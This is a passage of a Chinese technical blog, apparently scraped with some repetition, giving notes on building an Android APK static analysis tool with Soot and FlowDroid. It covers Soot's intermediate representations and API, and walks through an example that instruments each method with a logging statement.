<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethod(<span class="string">&quot;int area(boolean)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Modifier"><a href="#Modifier" class="headerlink" title="Modifier"></a>Modifier</h3><p>类、方法和字段的访问模式：<code>pulic</code>、<code>priavet</code>、<code>protected</code>、<code>final</code>、<code>abstract</code>等。这些信息保存在<code>Modifier</code>中，比如，查询一个方法是否为静态的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Modifier.isStatic(method.getModfiers())</span><br></pre></td></tr></table></figure>

<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>在<code>Body</code>中有<code>Units</code>，<code>Values</code>，<code>Traps</code>。</p>
<h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><p><code>Soot</code>可以修改方法的<code>Body</code>。然后可以使用<code>validate</code>检查修改是否正确。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stmt.apply(<span class="keyword">new</span> <span class="title class_">AbstractStmtSwitch</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseIfStmt</span><span class="params">(IfStmt stmt)</span> &#123;</span><br><span class="line">        stmt.setTarget(body.getUnits().getSuccOf(stmt));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">body.validate();</span><br></pre></td></tr></table></figure>

<h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><p>首先，<code>soot</code>使用<a target="_blank" rel="noopener" href="https://www.abartel.net/dexpler/"><em>Dexpler</em></a> 将 <code>Dalvik</code> 字节码转换为 <code>Jimple Body</code>。然后可以对整个程序进行转换、优化和注释。接下来， <code>Jimple</code> 转换包将在每个 <code>Jimple Body</code>上运行。最后，<code>Soot</code> 将所有 <code>Jimple Body</code>转换为 <code>Baf</code>（<code>Soot</code> 中的低级中间表示），并使用 <code>Dexpler</code> 将整个代码编译成 <code>APK</code>。</p>
<p><img src="https://miro.medium.com/max/1400/1*2E96Cu2BrZhrO74MxHCbTA.png" alt="img"></p>
<ul>
<li><code>jtp</code>，<code>jimple</code>转换包。</li>
<li><code>jop</code>，<code>jimple</code>优化包。</li>
<li><code>jap</code>，<code>jimple</code>注释包。</li>
</ul>
<p>关于包的具体信息可以看<a target="_blank" rel="noopener" href="https://github.com/soot-oss/soot/wiki/Packs-and-phases-in-Soot">这里</a>。</p>
<h3 id="Soot设置"><a href="#Soot设置" class="headerlink" title="Soot设置"></a>Soot设置</h3><p>关于<code>Option</code>的详细信息在<a target="_blank" rel="noopener" href="https://soot-oss.github.io/soot/docs/">这里</a>。</p>
<p>分析<code>APK</code>之前，<code>Soot</code>还需要进行一些设置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setupSoot</span><span class="params">(String androidJar, String apkPath, String outputPath)</span> &#123;</span><br><span class="line">    <span class="comment">// Reset the Soot settings (it&#x27;s necessary if you are analyzing several APKs)</span></span><br><span class="line">    G.reset();</span><br><span class="line">    <span class="comment">// Generic options</span></span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Read (APK Dex-to-Jimple) Options</span></span><br><span class="line">    Options.v().set_android_jars(androidJar); <span class="comment">// The path to Android Platforms</span></span><br><span class="line">    Options.v().set_src_prec(Options.src_prec_apk); <span class="comment">// Determine the input is an APK</span></span><br><span class="line">    Options.v().set_process_dir(Collections.singletonList(apkPath)); <span class="comment">// Provide paths to the APK</span></span><br><span class="line">    Options.v().set_process_multiple_dex(<span class="literal">true</span>);  <span class="comment">// Inform Dexpler that the APK may have more than one .dex files</span></span><br><span class="line">    Options.v().set_include_all(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Write (APK Generation) Options</span></span><br><span class="line">    Options.v().set_output_format(Options.output_format_dex);</span><br><span class="line">    Options.v().set_output_dir(outputPath);</span><br><span class="line">    Options.v().set_validate(<span class="literal">true</span>); <span class="comment">// Validate Jimple bodies in each transofrmation pack</span></span><br><span class="line">    <span class="comment">// Resolve required classes </span></span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.io.PrintStream&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().addBasicClass(<span class="string">&quot;java.lang.System&quot;</span>,SootClass.SIGNATURES);</span><br><span class="line">    Scene.v().loadNecessaryClasses();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="案例一-插入指令"><a href="#案例一-插入指令" class="headerlink" title="案例一 插入指令"></a>案例一 插入指令</h3><p>在每个方法中加入日志输出：<code>System.out.println(&quot;Beginning of method: &quot; + METHOD_NAME)</code>。<code>jimple</code>代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;&lt;SOOT_TUTORIAL&gt; Beginning of method METHOD_NAME&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Body转换：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PackManager.v().getPack(<span class="string">&quot;jtp&quot;</span>).add(<span class="keyword">new</span> <span class="title class_">Transform</span>(<span class="string">&quot;jtp.myLogger&quot;</span>, <span class="keyword">new</span> <span class="title class_">BodyTransformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">internalTransform</span><span class="params">(Body b, String phaseName, Map&lt;String, String&gt; options)</span> &#123;</span><br><span class="line">        <span class="comment">// First we filter out Android framework methods</span></span><br><span class="line">        <span class="keyword">if</span>(InstrumentUtil.isAndroidMethod(b.getMethod()))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">JimpleBody</span> <span class="variable">body</span> <span class="operator">=</span> (JimpleBody) b;</span><br><span class="line">        <span class="type">UnitPatchingChain</span> <span class="variable">units</span> <span class="operator">=</span> b.getUnits();</span><br><span class="line">        List&lt;Unit&gt; generatedUnits = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// The message that we want to log</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s Beginning of method %s&quot;</span>, InstrumentUtil.TAG, body.getMethod().getSignature());</span><br><span class="line">        <span class="comment">// In order to call &quot;System.out.println&quot; we need to create a local containing &quot;System.out&quot; value</span></span><br><span class="line">        <span class="type">Local</span> <span class="variable">psLocal</span> <span class="operator">=</span> InstrumentUtil.generateNewLocal(body, RefType.v(<span class="string">&quot;java.io.PrintStream&quot;</span>));</span><br><span class="line">        <span class="comment">// Now we assign &quot;System.out&quot; to psLocal</span></span><br><span class="line">        <span class="type">SootField</span> <span class="variable">sysOutField</span> <span class="operator">=</span> Scene.v().getField(<span class="string">&quot;&lt;java.lang.System: java.io.PrintStream out&gt;&quot;</span>);</span><br><span class="line">        <span class="type">AssignStmt</span> <span class="variable">sysOutAssignStmt</span> <span class="operator">=</span> Jimple.v().newAssignStmt(psLocal, Jimple.v().newStaticFieldRef(sysOutField.makeRef()));</span><br><span class="line">        generatedUnits.add(sysOutAssignStmt);</span><br><span class="line">        <span class="comment">// Create println method call and provide its parameter</span></span><br><span class="line">        <span class="type">SootMethod</span> <span class="variable">printlnMethod</span> <span class="operator">=</span> Scene.v().grabMethod(<span class="string">&quot;&lt;java.io.PrintStream: void println(java.lang.String)&gt;&quot;</span>);</span><br><span class="line">        <span class="type">Value</span> <span class="variable">printlnParamter</span> <span class="operator">=</span> StringConstant.v(content);</span><br><span class="line">        <span class="type">InvokeStmt</span> <span class="variable">printlnMethodCallStmt</span> <span class="operator">=</span> Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(psLocal, printlnMethod.makeRef(), printlnParamter));</span><br><span class="line">        generatedUnits.add(printlnMethodCallStmt);</span><br><span class="line">        <span class="comment">// Insert the generated statement before the first  non-identity stmt</span></span><br><span class="line">        units.insertBefore(generatedUnits, body.getFirstNonIdentityStmt());</span><br><span class="line">        <span class="comment">// Validate the body to ensure that our code injection does not introduce any problem (at least statically)</span></span><br><span class="line">        b.validate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h3 id="案例二-FlowDroid"><a href="#案例二-FlowDroid" class="headerlink" title="案例二 FlowDroid"></a>案例二 FlowDroid</h3><p><code>FlowDroid</code> 是一款用于 <code>Android</code> 应用程序和 <code>Java</code> 程序的数据流分析功能，项目<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid">地址</a>。</p>
<p>如果是使用 Maven，编辑 <code>pom.xml</code>即可：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-summaries<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-android<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果只使用命令行，则在<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>里下载<code>soot-infoflow-cmd-jar-with-dependencies.jar</code>即可。</p>
<p>如果不使用<code>pom.xml</code>，使用<code>jar</code>包的方式，需要去<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>下载<code>soot-infoflow-android-classes.jar</code>和<code>soot-infoflow-classes.jar</code>，再去Soot的<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=HzjYkP/HgkU1xzcZFUAgbQ==.ZT99lh7G5tR1RbjbWKkx7vAVeM5bMFQD///krUVFH6eMiI2TYxlBEYANDSAUtdFnviP1SJ4LWKbgY7RcZgTVjpwh0hB/sixiDALazZB/8Gw=">仓库</a>下载包含<code>heros</code>与<code>jasmin</code>的<code>sootclasses-trunk-jar-with-dependencies.jar</code>，将上述三个包加入项目依赖便完成了<code>FlowDroid</code>的配置。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-16T12:18:54.000Z" title="2022/5/16 20:18:54">2022-05-16</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-05-21T14:22:16.615Z" title="2022/5/21 22:22:16">2022-05-21</time></span><span class="level-item">16 minutes read (About 2396 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/05/16/Android%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/">Android静态分析工具开发笔记</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备写一款<code>Apk</code>的静态扫描工具，结合<code>FlowDroid</code>（底层采用<code>soot</code>）、<code>Jandroid</code>。后面会再参考一下其他的静态分析工具，如 <code>TaintDroid</code>。</p>
<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>给定一个输入程序，输出程序的属性。</p>
<h1 id="Soot"><a href="#Soot" class="headerlink" title="Soot"></a>Soot</h1><p><code>soot</code>有很多<code>Option</code>配置，可以参考<a target="_blank" rel="noopener" href="https://soot-oss.github.io/soot/docs/4.4.0-SNAPSHOT/options/soot_options.html#options">这里</a>或者<a target="_blank" rel="noopener" href="https://github.com/Sable/soot/wiki/Introduction:-Soot-as-a-command-line-tool">这里</a>。</p>
<h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><h3 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h3><p>介于 <code>Java</code> 和 <code>Java</code> 字节码之间，是一个基于语句的、类型化的（每个变量都有一个类型）和 <code>3-addressed</code>（每个语句最多有 3 个变量）的中间表示。</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) r0 := <span class="meta">@this</span>: FizzBuzz</span><br><span class="line">(<span class="number">2</span>) i0 := <span class="meta">@parameter0</span>: <span class="type">int</span></span><br><span class="line">(<span class="number">3</span>) $i1 = i0 % <span class="number">15</span></span><br><span class="line">(<span class="number">4</span>) <span class="keyword">if</span> $i1 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i2</span> <span class="operator">=</span> i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">5</span>) $r4 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">6</span>) virtualinvoke $r4.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;FizzBuzz&quot;</span>)</span><br><span class="line">(<span class="number">7</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">8</span>) $i2 = i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">9</span>) <span class="keyword">if</span> $i2 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i3</span> <span class="operator">=</span> i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">10</span>) $r3 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">11</span>) virtualinvoke $r3.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Buzz&quot;</span>)</span><br><span class="line">(<span class="number">12</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">13</span>) $i3 = i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">14</span>) <span class="keyword">if</span> $i3 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$r1</span> <span class="operator">=</span> &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">15</span>) $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">16</span>) virtualinvoke $r2.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Fizz&quot;</span>)</span><br><span class="line">(<span class="number">17</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">18</span>) $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">19</span>) virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(<span class="type">int</span>)</span>&gt;(i0)</span><br><span class="line">(<span class="number">20</span>) <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="Shimple"><a href="#Shimple" class="headerlink" title="Shimple"></a>Shimple</h3><p>与<code>Jimple</code>基本相同，是<code>Jimple</code>静态单任务形式的中间表示。</p>
<h3 id="Baf"><a href="#Baf" class="headerlink" title="Baf"></a>Baf</h3><p>是流线型的基于栈的字节表示。将<code>java</code>字节码转为基于栈的代码。</p>
<h3 id="Grimp"><a href="#Grimp" class="headerlink" title="Grimp"></a>Grimp</h3><p>与<code>Jimple</code> 类似，比<code>Jimple</code>更接近于<code>java</code>源码。容易阅读，方便人工阅读。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>基本的数据结构如下：</p>
<ul>
<li><p><code>Scene</code>，是一个单例类，表示所分析的环境。</p>
</li>
<li><p><code>SootClass</code>，用于表示<code>Scene</code>中的类。</p>
</li>
<li><p><code>SootMethod</code>，用于表示<code>SootClass</code>中的方法。</p>
</li>
<li><p><code>Body</code>，使用<code>Body</code>来访问<code>SootMethod</code>中的各种信息，每个<code>Body</code>里面有三个主链，分别是<code>Units</code>链、<code>Locals</code>链、<code>Traps</code>链。。</p>
<ul>
<li><code>Local，</code>方法内的局部变量。</li>
<li><code>Trap</code>，方法内的异常处理。</li>
<li><code>Unit</code>，方法体内的语句。</li>
</ul>
</li>
</ul>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/sootarch.png" alt="sootarch"></p>
<p>还有四种<code>Body</code>，对应四种中间表示：<code>BafBody</code>、<code>JimpleBody</code>、<code>ShimpleBody</code>、<code>GrimpBody</code>，<code>Soot</code> 中的默认 <code>IR</code> 是 **<code>Jimple</code>**（<code>Java Simple</code>）。</p>
<h3 id="Unit（Jimple中是Stmt）"><a href="#Unit（Jimple中是Stmt）" class="headerlink" title="Unit（Jimple中是Stmt）"></a>Unit（Jimple中是Stmt）</h3><p>表示<code>Unit</code>语句。主要有以下几种：</p>
<ul>
<li>过程内控制流：<code>NopStmt</code>，<code>IdentityStmt</code>，<code>AssignStmt</code>。<ul>
<li><code>IdentityStmt</code>：通常指的是对变量赋值，这个变量既可以是显示的也可以是隐式的。</li>
<li>一个<code>IdentityStmt</code>将特殊值，如参数、<code>this</code>或被捕获的异常，分配给一个<code>Local</code>。</li>
<li>所有正常的赋值，例如从一个<code>Local</code>到另一个<code>Local</code>，或者从一个<code>Constant</code>到一个<code>Local</code>，都是用<code>AssignStmt</code>表示的。</li>
</ul>
</li>
<li>过程间的控制流：<code>IfStmt</code> ， <code>GotoStmt</code> ， <code>SwitchStmt</code>，<code>InvokeStmt</code>，<code>ReturnStmt</code>，<code>ReturnVoidStmt</code>， <code>ThrowStmt</code>。</li>
<li>监控语句：<code>MonitorStmt</code>。</li>
<li>赋值语句：<code>DefinitionStmt</code>。</li>
<li>其它类型：<code>NopStmt</code>，<code>BreakponitStmt</code>。</li>
</ul>
<h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h3><ul>
<li><code>Local</code></li>
<li><code>Constant</code></li>
<li><code>Ref</code></li>
<li><code>Expr</code></li>
</ul>
<h4 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h4><p><strong>JimpleLocal</strong>：<code>local</code>变量</p>
<p><strong>TemporaryRegisterLocal</strong>： <code>$</code>开头的临时变量</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20210619180333086.png" alt="image-20210619180333086"></p>
<h4 id="Constant"><a href="#Constant" class="headerlink" title="Constant"></a>Constant</h4><p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20210619182313742.png" alt="image-20210619182313742"></p>
<h4 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h4><p><code>ConcreteRef</code>：</p>
<ul>
<li><code>ArrayRef</code>：指向数组。</li>
<li><code>FieldRef</code>： 指向<code>field</code>。<ul>
<li><code>StaticFieldRef </code>：静态<code>field</code>的引用。</li>
<li><code>InstanceFieldRef</code> ：指向的<code>field</code>是一个对象实例。</li>
</ul>
</li>
</ul>
<p><code>IdentityRef</code>：</p>
<ul>
<li><code>CaughtExcrptionRef </code>：指向捕获到的异常的引用</li>
<li><code>ParameterRef</code>：函数参数的引用</li>
<li><code>ThisRef</code> ：<code>this</code>的引用</li>
</ul>
<h4 id="Expr"><a href="#Expr" class="headerlink" title="Expr"></a>Expr</h4><p>一般来说，一个<code>Expr</code>可以对若干个<code>Value</code>进行一些操作并且返回另一个<code>Value</code>。在<code>Jimple</code>中，强制要求所有的<code>Value</code><strong>最多包含一个表达式</strong>。</p>
<p><strong><code>Stmt</code>和<code>Expr</code>的区别</strong>：<code>Stmt</code>没有返回值，<code>Expr</code>有返回值。</p>
<h3 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h3><p><code>Box</code>是指针，提供了对<code>Soot</code>对象的间接访问。<strong>一个<code>Box</code>提供了一个间接访问<code>soot(Unit,Value)</code>的入口</strong>，类似于<code>Java</code>的一个引用。当<code>Unit</code>包含另一个<code>Unit</code>的时候，需要通过<code>Box</code>来访问，<code>Soot</code> 里提供了两种类型的<code>Box</code>, 一个是<code>ValueBox</code>一个是<code>UnitBox</code>。</p>
<ul>
<li><code>ValueBox</code>，指向<code>Values</code>：<ul>
<li>对于一条<code>Unit</code>来说，他的<code>ValueBox</code>存储的是在这条语句内部所<strong>用到</strong>的和<strong>所定义</strong>的语句。</li>
</ul>
</li>
<li><code>UnitBox</code>，指向<code>Units</code>：<ul>
<li>以<code>goto</code>语句为例，<code>UnitBox</code>其实存的就是<code>goto</code>所指的下一跳节点。</li>
<li><code>switch</code>语句，则会包含很多<code>boxes</code>。</li>
</ul>
</li>
</ul>
<p>还需要知道以下的规则：</p>
<ul>
<li>**一个<code>Unit</code>可以有多个<code>UnitBox</code>，但是每个<code>UnitBox</code>只能指向一个<code>Unit</code>**。<code>GotoStmt</code> 需要知道目标的<code>Unit</code>是什么，所以一个<code>Unit</code>会包含其它的<code>UnitBox</code>，通过 <code>UnitBox</code>获取下一个<code>Unit</code>。</li>
<li>**一个<code>Value</code>可以对应多个<code>ValueBox</code>，但是一个<code>ValueBox</code>只能对应一个<code>Value</code>**，对于一个<code>Unit</code>，可以得到很多个<code>ValueBox</code>，包含着这条语句内部的所用到和所定义的语句。</li>
</ul>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20210325104642746.png" alt="image-20210325104642746"></p>
<h2 id="基本API"><a href="#基本API" class="headerlink" title="基本API"></a>基本API</h2><h3 id="SootClass"><a href="#SootClass" class="headerlink" title="SootClass"></a>SootClass</h3><p>获取一个类的信息，如果类是在一个包里，则应该包含完整的包名：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass = Scene.v().getSootClass(<span class="string">&quot;Circle&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如果分析的类不再<code>Scene</code>中，则<code>getSootClass</code>将返回一个<code>Phantom</code>类或者是异常。<code>Phantom</code>类不影响分析的进行，这在不关注其他模块的代码时很有用。如果要确保查询的类存在，可以通过<code>getSootClassUnsafe(className, false)</code>（如果不存在，则结果为空）检索它h或者使用<code>circleClass.isPhantom()</code>判断它是不是为<code>Phantom</code>类。</p>
<h3 id="SootField"><a href="#SootField" class="headerlink" title="SootField"></a>SootField</h3><p>类中包含字段和方法，通过名称和类型来查找它们：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootField</span> <span class="variable">radiusField</span> <span class="operator">=</span> circleClass.getField(<span class="string">&quot;radius&quot;</span>, IntType.v())</span><br></pre></td></tr></table></figure>

<h3 id="SootMethod"><a href="#SootMethod" class="headerlink" title="SootMethod"></a>SootMethod</h3><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/1_ESTs9adMHZn7oHPWJo5e8w.png" alt="1_ESTs9adMHZn7oHPWJo5e8w" style="zoom:67%;" />

<p>一般情况下使用<code>getMethodByName</code>即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethodByName(<span class="string">&quot;getCircleCount&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是对于方法重载，需要使用<code>getMethod</code>方法，并提供<code>Subsignature</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethod(<span class="string">&quot;int area(boolean)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>类、方法和字段的访问模式：<code>pulic</code>、<code>priavet</code>、<code>protected</code>、<code>final</code>、<code>abstract</code>等。这些信息保存在<code>Modifier</code>中，比如，查询一个方法是否为静态的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Modifier.isStatic(method.getModfiers())</span><br></pre></td></tr></table></figure>

<h3 id="Body"><a href="#Body" class="headerlink" title="Body"></a>Body</h3><p>在<code>Body</code>中有<code>Units</code>，<code>Values</code>，<code>Traps</code>。</p>
<h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><p><code>Soot</code>可以修改方法的<code>Body</code>。然后可以使用<code>validate</code>检查修改是否正确。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stmt.apply(<span class="keyword">new</span> <span class="title class_">AbstractStmtSwitch</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseIfStmt</span><span class="params">(IfStmt stmt)</span> &#123;</span><br><span class="line">        stmt.setTarget(body.getUnits().getSuccOf(stmt));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">body.validate();</span><br></pre></td></tr></table></figure>

